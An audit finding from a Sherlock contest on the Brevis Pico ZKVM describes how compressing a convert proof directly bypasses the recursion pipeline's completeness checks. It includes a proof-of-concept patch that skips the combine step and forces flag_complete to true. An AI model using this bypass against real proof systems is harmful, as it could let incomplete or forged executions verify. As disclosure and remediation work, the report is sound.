---
tags:
  - lang/rust
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/infra
  - sector/zk
protocol: "[[Brevis]]"
auditors:
  - "[[MissDida]]"
  - "[[cergyk]]"
report: "https://github.com/sherlock-audit/2025-08-pico-judging"
genome:
  - "[[wrong-condition]]"
  - "[[wrong-state]]"
  - "[[bridge-merkle-proof]]"
---
# H-5: compress right after convert can bypass completeness checks

- id: 63636
- impact: HIGH
- protocol: [[Brevis]] Pico ZKVM
- reporter: cergyk (Sherlock)
- source: N/A

## Summary


The bug report discusses a potential issue in the recursion pipeline of pico, where a single chunk can be verified as a complete execution by the compress recursion circuit. This could potentially lead to incorrect verification of proofs. A proof of concept (POC) is provided to demonstrate the issue and recommendations are made to fix it. The protocol team has already addressed the issue in their recent PRs/commits.

## Details


Source: https://github.com/sherlock-audit/2025-08-pico-judging/issues/137 

## Found by 
MissDida, cergyk

### Description

In the recursion pipeline of pico, multiple recursion circuits are whitelisted, and the typical recursion pipeline goes like this:

1. riscv proof (leaf) -> A single precompile, memory, or execution chunk is proven
2. convert -> Leaf riscv proof is converted to a recursion-compatible proof (has recursion public values)
3. combine -> Multiple recursion proofs are combined together into one. Checks execution completeness (all shards are included).
4. compress -> Checks that the proof is complete and reduces the size of the proof
5. embed -> Adapts the proof field to be compatible with on-chain verifying

At each step of recursion, it is checked that the provided child proofs have vks included in merkle tree (below is the combine step):

[vk_merkle/builder.rs#L67-L102](https://github.com/brevis-network/pico/blob/audit/vm/src/instances/compiler/vk_merkle/builder.rs#L67-L102):
```rust
    pub fn build(
        machine: &BaseMachine<SC, C>,
        input: &RecursionVkStdin<SC, C>,
    ) -> RecursionProgram<Val<SC>> {
        debug!("Build CombineVkVerifierCircuit Program");
        // Construct the builder.
        let mut builder = Builder::<CC>::new();
        let input = input.read(&mut builder);
        let RecursionVkStdinVariable {
            recursion_stdin_var,
            merkle_proof_var,
        } = input;


        let vk_root: [Felt<Val<SC>>; 8] = merkle_proof_var.merkle_root.map(|x| builder.eval(x));

        // Constraint that the vk_root of the merkle tree aligns with the vk_root of the recursion_stdin
        for (expected, actual) in vk_root.iter().zip(recursion_stdin_var.vk_root.iter()) {
            builder.assert_felt_eq(*expected, *actual);
        }

        // Constraint that ensures all the vk of the recursion program are included in the vk Merkle tree.
        //@audit-ok all of the child proofs vks are included in the merkle tree
>>     let vk_digests = recursion_stdin_var
            .vks
            .iter()
            .map(|vk| vk.hash_field(&mut builder))
            .collect::<Vec<_>>();


        MerkleProofVerifier::verify(&mut builder, vk_digests, merkle_proof_var);
        CombineVerifierCircuit::build_verifier(&mut builder, machine, recursion_stdin_var);
        let operations = builder.into_operations();


        // Compile the program.
        let mut compiler = DslIrCompiler::<CC>::default();
        compiler.compile(operations)
    }
}
```

Unfortunately, it seems that it has not been considered that a `convert` proof could also be verified directly by a `compress` proof. A single chunk can be provided (for example, a precompile chunk with only padding rows) with a flag_complete set to true, and would be verified as complete execution by the compress recursion circuit.

### POC

Apply the following changes to the prover_chain and run test_proverchain:

`git apply POC.patch`
`RUST_LOG=INFO FRI_QUERIES=1 VK_VERIFICATION=false cargo run --package pico-vm --example test_proverchain -- --elf=fib --n=3`

POC.patch:
```diff
diff --git a/vm/examples/test_proverchain.rs b/vm/examples/test_proverchain.rs
index 2dcc21f..0f263de 100644
--- a/vm/examples/test_proverchain.rs
+++ b/vm/examples/test_proverchain.rs
@@ -39,8 +39,8 @@ fn main() {
     info!("Proving RECURSION..");
     let proof = convert.prove(proof);
     assert!(convert.verify(&proof, riscv_vk));
-    let proof = combine.prove(proof);
-    assert!(combine.verify(&proof, riscv_vk));
+    // let proof = combine.prove(proof);
+    // assert!(combine.verify(&proof, riscv_vk));
     let proof = compress.prove(proof);
     assert!(compress.verify(&proof, riscv_vk));
     let proof = embed.prove(proof);
diff --git a/vm/src/emulator/stdin.rs b/vm/src/emulator/stdin.rs
index 3bce848..cfca957 100644
--- a/vm/src/emulator/stdin.rs
+++ b/vm/src/emulator/stdin.rs
@@ -217,13 +217,14 @@ where
         riscv_vk.observed_by(&mut reconstruct_challenger);
 
         // construct programs and inputs
-        let total = proofs.len();
+        // let total = proofs.len();
 
         let pairs: Vec<_> = proofs
             .par_iter()
             .enumerate()
             .map(|(i, proof)| {
-                let flag_complete = i == total - 1;
+                //@audit-ok set flag_complete always true
+                let flag_complete = true;
                 let flag_first_chunk = i == 0;
 
                 let input = ConvertStdin {
@@ -249,6 +250,8 @@ where
 
                 (program, input)
             })
+            //@audit-ok have only one proof for compress down the line
+            .take(1)
             .collect();
 
         let (programs, inputs): (Vec<_>, Vec<_>) = pairs.into_iter().unzip();
```

### Recommendation

It seems that the simpler way to fix this is to either check the completeness conditions on a `convert proof` (`exit_code == 0` and `end_pc == 0` and `contains_cpu`), or more radically, to not allow setting `flag_complete == true` in `convert`

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/brevis-network/pico/pull/61
